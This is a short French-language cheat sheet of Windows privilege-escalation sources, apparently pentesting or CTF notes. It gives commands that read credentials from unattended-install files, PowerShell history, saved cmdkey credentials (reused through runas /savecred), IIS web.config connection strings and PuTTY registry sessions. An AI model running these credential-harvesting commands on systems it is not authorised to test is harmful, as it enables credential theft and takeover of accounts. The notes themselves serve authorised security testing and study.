# Windows

Quelques sources possibles d'escalation de privilèges sous windows

### Unattended Windows Installations

Avec MDT:
```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
```

Peut contenir :

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>domain.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

cmd.exe
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

powershell.exe
```
cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials

```
cmdkey /list
```

En cas de trouvaille interressante 
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration

web.config
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
